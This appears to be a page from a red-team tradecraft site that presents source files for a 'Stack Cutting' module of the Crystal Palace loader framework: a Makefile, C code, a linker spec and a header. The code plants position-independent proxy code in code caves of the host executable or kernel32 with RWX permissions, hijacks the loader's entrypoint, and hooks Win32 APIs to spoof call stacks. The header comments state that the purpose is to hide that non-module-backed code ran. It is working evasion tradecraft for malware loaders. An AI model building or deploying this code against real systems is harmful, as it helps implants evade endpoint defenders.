| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26 | `CC=i686-w64-mingw32-gcc`<br>`CC_64=x86_64-w64-mingw32-gcc`<br>`CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith`<br>`.PHONY: all x86 x64 clean`<br>`all: x86 x64`<br>`bin:`<br>```mkdir``-p bin`<br>`# our proxy.c expects a very specific stackframe layout and function prologue. We disable optimizations to`<br>`# preserve it. This applies to x86 and x64.`<br>`x86: bin`<br>```$(CC) -DWIN_X86 -O0 -fno-jump-tables -shared -Wall -Wno-pointer-arith -c src``/proxy``.c -o bin``/proxy``.x86.o`<br>```$(CC) -DWIN_X86 $(CFLAGS) -c src``/stackcut``.c -o bin``/stackcut``.x86.o`<br>```$(CC) -DWIN_X86 $(CFLAGS) -c src``/stackcut_setup``.c -o bin``/stackcut_setup``.x86.o`<br>`x64: bin`<br>```$(CC_64) -DWIN_X64 -O0 -fno-jump-tables -shared -Wall -Wno-pointer-arith -c src``/proxy``.c -o bin``/proxy``.x64.o`<br>```$(CC_64) -DWIN_X64 $(CFLAGS) -c src``/stackcut``.c -o bin``/stackcut``.x64.o`<br>```$(CC_64) -DWIN_X64 $(CFLAGS) -c src``/stackcut_setup``.c -o bin``/stackcut_setup``.x64.o`<br>`clean:`<br>```rm``-rf bin` |

## Stack Cutting

[üîô](https://tradecraftgarden.org/stackcutting.html#)
stackcut\_setup.c
[üîó](https://tradecraftgarden.org/stackcutting.html?file=stackcut_setup.c)

[?](https://tradecraftgarden.org/stackcutting.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100<br>101<br>102<br>103<br>104<br>105<br>106<br>107<br>108<br>109<br>110<br>111<br>112<br>113<br>114<br>115<br>116<br>117<br>118<br>119<br>120<br>121<br>122<br>123<br>124<br>125<br>126<br>127<br>128<br>129<br>130<br>131<br>132<br>133<br>134<br>135<br>136<br>137<br>138<br>139<br>140<br>141<br>142<br>143<br>144<br>145<br>146<br>147<br>148<br>149<br>150<br>151<br>152<br>153<br>154<br>155<br>156<br>157<br>158<br>159<br>160<br>161 | `/*`<br>```* Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild`<br>```*`<br>```* Redistribution and use in source and binary forms, with or without modification, are`<br>```* permitted provided that the following conditions are met:`<br>```*`<br>```* 1. Redistributions of source code must retain the above copyright notice, this list of`<br>```* conditions and the following disclaimer.`<br>```*`<br>```* 2. Redistributions in binary form must reproduce the above copyright notice, this list of`<br>```* conditions and the following disclaimer in the documentation and/or other materials provided`<br>```* with the distribution.`<br>```*`<br>```* 3. Neither the name of the copyright holder nor the names of its contributors may be used to`<br>```* endorse or promote products derived from this software without specific prior written`<br>```* permission.`<br>```*`<br>```* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS √É¬¢√Ç‚Ç¨√Ç≈ìAS IS√É¬¢√Ç‚Ç¨√Ç¬ù AND ANY EXPRESS`<br>```* OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF`<br>```* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE`<br>```* COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,`<br>```* EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF`<br>```* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)`<br>```* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR`<br>```* TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,`<br>```* EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`<br>```*/`<br>`#include <windows.h>`<br>`#include "tcg.h"`<br>`#include "proxy.h"`<br>`WINBASEAPI``HMODULE``WINAPI KERNEL32$GetModuleHandleA (``LPCSTR``lpModuleName);`<br>`WINBASEAPI``LPVOID``WINAPI KERNEL32$VirtualAlloc (``LPVOID``lpAddress,``SIZE_T``dwSize,``DWORD``flAllocationType,``DWORD``flProtect);`<br>`WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (``LPVOID``lpAddress,``SIZE_T``dwSize,``DWORD``flNewProtect, PDWORD lpflOldProtect);`<br>`/*`<br>```* This is the Crystal Palace convention for getting ahold of data linked with this loader.`<br>```*/`<br>`char``rPROXYPIC[0]¬†¬†¬† __attribute__((section(``"my_proxy"``)));`<br>`typedef``struct``{`<br>```int``length;`<br>```char``value[];`<br>`} _RESOURCE;`<br>`/* these might help */`<br>`#define memset(x, y, z) __stosb((unsigned char *)x, y, z);`<br>`#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);`<br>`#define FLAG(x, y) ( ((x) & (y)) == (y) )`<br>`#define ROUND_DOWN_PAGE(x) (char *)((ULONG_PTR)x - ((ULONG_PTR)x % 0x1000))`<br>`/*`<br>```* find slack space at the end of an eXecutable section that can fit our payload.`<br>```*/`<br>`char``* findCodeCave(``char``* dllBase,``int``length) {`<br>```DLLDATA¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† data;`<br>```DWORD``numberOfSections;`<br>```IMAGE_SECTION_HEADER¬† * sectionHdr¬†¬†¬†¬†¬†¬† = NULL;`<br>```IMAGE_SECTION_HEADER¬† * sectionNxt¬†¬†¬†¬†¬†¬† = NULL;`<br>```/* parse our DLL! */`<br>```ParseDLL(dllBase, &data);`<br>```/* loop through our sections */`<br>```numberOfSections = data.NtHeaders->FileHeader.NumberOfSections;`<br>```sectionHdr¬†¬†¬†¬†¬†¬† = (IMAGE_SECTION_HEADER *)PTR_OFFSET(data.OptionalHeader, data.NtHeaders->FileHeader.SizeOfOptionalHeader);`<br>```for``(``int``x = 0; (x + 1) < numberOfSections; x++) {`<br>```/* look for our eXecutable section, there-in lives our... code cave */`<br>```if``(FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_EXECUTE)) {`<br>```/* let's look at our next section, we need it to get the right size of the code cave */`<br>```sectionNxt¬†¬†¬†¬†¬† = sectionHdr + 1;`<br>```/* calculate the size, based on section headers */`<br>```DWORD``size¬†¬†¬†¬†¬† = sectionNxt->VirtualAddress - sectionHdr->VirtualAddress;`<br>```/* calculate the size of our code cave */`<br>```DWORD``cavesize¬† = size - sectionHdr->SizeOfRawData;`<br>```/* if we fit, return it */`<br>```if``(length < cavesize)`<br>```return``dllBase + (sectionNxt->VirtualAddress - cavesize);`<br>```}`<br>```/* advance to our next section */`<br>```sectionHdr++;`<br>```}`<br>```return``NULL;`<br>`}`<br>`/*`<br>```* Install our proxy PIC somewhere in memory, ideally in image memory (e.g., backed by a module on disk). This is`<br>```* a risky and unmasked operation... but once this is done, we've got a nice call stack munging proxy that can run`<br>```* whatever we give to it. And, that's pretty cool.`<br>```*/`<br>`PROXY SetupProxy() {`<br>```_RESOURCE¬† * src;`<br>```DWORD``oldProt;`<br>```char``* hModule;`<br>```PROXY¬†¬†¬†¬†¬†¬†¬† proxy;`<br>```src = (_RESOURCE *)&rPROXYPIC;`<br>```/* (1) we're going to search for a code cave in... our executable */`<br>```hModule = (``char``*)KERNEL32$GetModuleHandleA(NULL);`<br>```proxy¬†¬† = (PROXY)findCodeCave(hModule, src->length);`<br>```/* (2) if we can't find a code cave in our executable, let's find one elsewhere. How about kernel32?`<br>```* And, a good place to note: bad idea on x86. There are reserved sections between sections breaking`<br>```* my code cave calculation algorithm. You'll end up in memory you don't want to be in. */`<br>`#ifdef WIN_X64`<br>```if``(proxy == NULL) {`<br>```/*`<br>```* Note, we could use a stack string here or findModuleByHash with the ror13 hash of KERNEL32`<br>```* But, my goal is demonstration of concepts and not leetsy-neatsy-wow, I applied ro13 999x`<br>```* style "mastery of OPSEC"`<br>```*/`<br>```hModule¬†¬† = (``char``*)KERNEL32$GetModuleHandleA(``"KERNEL32"``);`<br>```proxy¬†¬†¬†¬† = (PROXY)findCodeCave(hModule, src->length);`<br>```}`<br>`#endif`<br>```/* (3) if there's no space in our executable, then just do a VirtualAlloc--life goes on */`<br>```if``(proxy == NULL)`<br>```proxy = (PROXY)KERNEL32$VirtualAlloc( NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );`<br>```/* change the permissions of our PIC to RWX */`<br>```KERNEL32$VirtualProtect(ROUND_DOWN_PAGE(proxy), 0x1000, PAGE_EXECUTE_READWRITE, &oldProt);`<br>```/* copy our proxy PIC over */`<br>```memcpy``(proxy, src->value, src->length);`<br>```return``proxy;`<br>`}`<br>`/* our config functions */`<br>`void``configstackcutting(PROXY proxy,``char``* retaddr,``char``* frameaddr);`<br>`/* our initialization chain */`<br>`void``init();`<br>`/*`<br>```* Our new entrypoint that's going to hijack the existing one.`<br>```*/`<br>`void``go() {`<br>```/*`<br>```* Note, we're using MingW64 intrinsics to get our frame ptr and return address.`<br>```* I'm peeking the value of the frame ptr here to go one frame up.`<br>```*/`<br>```char``* retaddr¬†¬† = __builtin_return_address(0);`<br>```char``* frameaddr = *(``char``**)__builtin_frame_address(0);`<br>```/* setup our proxy */`<br>```PROXY proxy = SetupProxy();`<br>```/* push it over to our other module */`<br>```configstackcutting(proxy, retaddr, frameaddr);`<br>```/* start our init chain */`<br>```init();`<br>`}` |

## Stack Cutting

[üîô](https://tradecraftgarden.org/stackcutting.html#)
LICENSE.txt
[üîó](https://tradecraftgarden.org/stackcutting.html?file=LICENSE.txt)

[?](https://tradecraftgarden.org/stackcutting.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25 | `Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild`<br>`Redistribution and use in source and binary forms, with or without modification, are`<br>`permitted provided that the following conditions are met:`<br>`1. Redistributions of source code must retain the above copyright notice, this list of`<br>`conditions and the following disclaimer.`<br>`2. Redistributions in binary form must reproduce the above copyright notice, this list of`<br>`conditions and the following disclaimer in the documentation and/or other materials provided`<br>`with the distribution.`<br>`3. Neither the name of the copyright holder nor the names of its contributors may be used to`<br>`endorse or promote products derived from this software without specific prior written`<br>`permission.`<br>`THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS √É¬¢√Ç‚Ç¨√Ç≈ìAS IS√É¬¢√Ç‚Ç¨√Ç¬ù AND ANY EXPRESS`<br>`OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF`<br>`MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE`<br>`COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,`<br>`EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF`<br>`SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)`<br>`HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR`<br>`TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,`<br>`EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.` |

## Stack Cutting

[üîô](https://tradecraftgarden.org/stackcutting.html#)
stackcutting.spec
[üîó](https://tradecraftgarden.org/stackcutting.html?file=stackcutting.spec)

[?](https://tradecraftgarden.org/stackcutting.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100<br>101<br>102<br>103<br>104<br>105<br>106<br>107<br>108<br>109<br>110<br>111<br>112<br>113<br>114<br>115<br>116<br>117<br>118<br>119<br>120<br>121<br>122<br>123<br>124<br>125<br>126<br>127<br>128<br>129<br>130<br>131<br>132 | `#`<br>`# some helper labels, since we specify the attach functions twice.`<br>`#`<br>`attach.x86:`<br>```# attach Win32 API interests to our hook functions`<br>```attach``"KERNEL32$LoadLibraryA"``"__cLoadLibraryA@4"`<br>```attach``"KERNEL32$Sleep"``"__cSleep@4"`<br>```attach``"KERNEL32$VirtualAlloc"``"__cVirtualAlloc@16"`<br>```attach``"KERNEL32$VirtualProtect"``"__cVirtualProtect@16"`<br>```attach``"USER32$MessageBoxA"``"__cMessageBoxA@16"`<br>```# since this is a terminal hooking (e.g., we expect DIRECT access to the Win32 API), I'm using protect to prevent`<br>```# anything else from hooking/incepting our hook functions themselves`<br>```protect``"__cLoadLibraryA@4, __cSleep@4, __cVirtualAlloc@16, __cVirtualProtect@16, __cMessageBoxA@16"`<br>`attach.x64:`<br>```attach``"KERNEL32$LoadLibraryA"``"_cLoadLibraryA"`<br>```attach``"KERNEL32$Sleep"``"_cSleep"`<br>```attach``"KERNEL32$VirtualAlloc"``"_cVirtualAlloc"`<br>```attach``"KERNEL32$VirtualProtect"``"_cVirtualProtect"`<br>```attach``"USER32$MessageBoxA"``"_cMessageBoxA"`<br>```protect``"_cLoadLibraryA, _cSleep, _cVirtualAlloc, _cVirtualProtect, _cMessageBoxA"`<br>`#`<br>`# Setup our stack cutting tradecraft.`<br>`#`<br>`setup.x86:`<br>```# GYMNASTICS WARNING: stackcutting has to execute before anything else to get the safe return/frame address. So,`<br>```# before we merge anything, we're going to get rid of the old go() function. Our stackcut_setup.x86 will have a new`<br>```# go() function.`<br>```remap``"_go"``"_go_away"`<br>```# load+merge our stackcutting initialization logic`<br>```load``"bin/stackcut_setup.x86.o"`<br>```merge`<br>```# the getStart() function in loader.c STILL refers to _go_away (it's a linkage by relative address, not symbol); so`<br>```# we use redirect to change that reference to our newly merged in go. Voila, we've taken ovr the entrypoint function`<br>```redirect``"_go_away"``"_go"`<br>```# load+merge our stackcutting hooks... because this is where our globals are too`<br>```load``"bin/stackcut.x86.o"`<br>```merge`<br>```# load our proxy PIC as a resource.`<br>```load``"bin/proxy.x86.o"`<br>```# This is PIC but we're not bothering with dfr, fixptrs, and +gofirst. It's not needed here. This PIC is`<br>```# a simple one-off call gate function.`<br>```make``pic`<br>```export`<br>```preplen`<br>```link``"my_proxy"`<br>```# register this with our thing.`<br>```redirect``"_setupHooks"``"_setupHooksStackCutting"`<br>```# we use optout to protect _SetupProxy from its own hooks, but to leave it open to inception by another module`<br>```optout``"_SetupProxy"``"__cVirtualAlloc@16, __cVirtualProtect@16"`<br>```# WHY yes... we can HOOK our loader PIC with the same hook code used in our IAT hooking. This is one of the`<br>```# reasons I wanted to merge our stack cutting hooks into this loader/setup module too. They do double duty now :)`<br>```.attach`<br>```# While .attach let's our hooks do double-duty (e.g., getting used to incept our own PIC)--in practice VirtualAlloc`<br>```# and LoadLibraryA are what's kept and used here. But, hey... transparent stack tradecraft in a PIC DLL loader that's`<br>```# applying stack tradecraft to a DLL is pretty damned cool, right?`<br>```#`<br>```# To see what's kept after link-time optimization, uncomment this line. It's also a good opportunity to look at how`<br>```# and where _LoadLibraryA and _VirtualAlloc are called. You'll see they're just weaved into the program`<br>```#disassemble "setup.x86.txt"`<br>`setup.x64:`<br>```remap``"go"``"go_away"`<br>```load``"bin/stackcut_setup.x64.o"`<br>```merge`<br>```redirect``"go_away"``"go"`<br>```load``"bin/stackcut.x64.o"`<br>```merge`<br>```load``"bin/proxy.x64.o"`<br>```make``pic`<br>```export`<br>```preplen`<br>```link``"my_proxy"`<br>```redirect``"setupHooks"``"setupHooksStackCutting"`<br>```optout``"SetupProxy"``"_cVirtualAlloc, _cVirtualProtect"`<br>```.attach`<br>```#disassemble "setup.x64.txt"`<br>`#`<br>`# configure the stackcutting hooks (this is to be merged in with our hooks PICO, right?)`<br>`#`<br>`hooks.x86:`<br>```# load our stack cutting hooks logic and merge with the hooks PICO`<br>```load``"bin/stackcut.x86.o"`<br>```merge`<br>```# export our confighooks function, which is necessary for setupHooksStackCutting to`<br>```# find our configstackcutting function mixed into the hooks PICO`<br>```exportfunc``"_configstackcutting"``"___tag_configstackcutting"`<br>```# add our hooks, which will return attach chain entries`<br>```addhook``"KERNEL32$LoadLibraryA"`<br>```addhook``"KERNEL32$Sleep"`<br>```addhook``"KERNEL32$VirtualAlloc"`<br>```addhook``"KERNEL32$VirtualProtect"`<br>```addhook``"USER32$MessageBoxA"`<br>```# attach to our Win32 APIs`<br>```.attach`<br>`hooks.x64:`<br>```load``"bin/stackcut.x64.o"`<br>```merge`<br>```exportfunc``"configstackcutting"``"__tag_configstackcutting"`<br>```addhook``"KERNEL32$LoadLibraryA"`<br>```addhook``"KERNEL32$Sleep"`<br>```addhook``"KERNEL32$VirtualAlloc"`<br>```addhook``"KERNEL32$VirtualProtect"`<br>```addhook``"USER32$MessageBoxA"`<br>```.attach` |

## Stack Cutting

[üîô](https://tradecraftgarden.org/stackcutting.html#)
proxy.h
[üîó](https://tradecraftgarden.org/stackcutting.html?file=proxy.h)

[?](https://tradecraftgarden.org/stackcutting.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67 | `/*`<br>```* Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild`<br>```*`<br>```* Redistribution and use in source and binary forms, with or without modification, are`<br>```* permitted provided that the following conditions are met:`<br>```*`<br>```* 1. Redistributions of source code must retain the above copyright notice, this list of`<br>```* conditions and the following disclaimer.`<br>```*`<br>```* 2. Redistributions in binary form must reproduce the above copyright notice, this list of`<br>```* conditions and the following disclaimer in the documentation and/or other materials provided`<br>```* with the distribution.`<br>```*`<br>```* 3. Neither the name of the copyright holder nor the names of its contributors may be used to`<br>```* endorse or promote products derived from this software without specific prior written`<br>```* permission.`<br>```*`<br>```* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS √É¬¢√Ç‚Ç¨√Ç≈ìAS IS√É¬¢√Ç‚Ç¨√Ç¬ù AND ANY EXPRESS`<br>```* OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF`<br>```* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE`<br>```* COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,`<br>```* EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF`<br>```* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)`<br>```* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR`<br>```* TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,`<br>```* EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`<br>```*/`<br>`#include <windows.h>`<br>`/*`<br>```* Set the return address and frame address of the (real) stack frame we want to point back to. I use`<br>```* this to create a stack that looks like our non-module backed code was never called. If you don't have`<br>```* anything like that, then set both to 0 to break some means of stack unwinding.`<br>```*/`<br>`typedef``struct``{`<br>```ULONG_PTR``frameaddr;`<br>```ULONG_PTR``retaddr;`<br>`} FRAME;`<br>`/*`<br>```* This is an internal struct, just keeping some info off of the stack, so I don't have to keep`<br>```* adjusting proxy.c based on the number of local vars.`<br>```*`<br>```* You, as an API caller, have no responsibility to any of this.`<br>```*/`<br>`typedef``struct``{`<br>```FRAME¬†¬†¬†¬† * p_frame;`<br>```FRAME¬†¬†¬†¬†¬†¬† frame;`<br>`} __INTERNAL;`<br>`/*`<br>```* Our proxycall struct, this is where we pass in arguments for our PIC proxy function`<br>```* to act on. Each of the arguments is annotated below.`<br>```*/`<br>`typedef``struct``{`<br>```ULONG_PTR``function;``/* a pointer to the function we want the proxy to call */`<br>```DWORD``argc;``/* the number of arguments being passed, args[argc] and argc must agree */`<br>```__INTERNAL temp;``/* don't touch this, not even to zero it, used by the proxy function */`<br>```FRAME¬†¬†¬†¬†¬† spoofme;``/* the return address and frame address we want to "spoof" */`<br>```ULONG_PTR``args[4];``/* the arguments to our function */`<br>`} PROXYCALL;`<br>`/*`<br>```* And, as simple as this, it's our proxy call function`<br>```*/`<br>`typedef``ULONG_PTR``(*PROXY)(PROXYCALL * desc);` |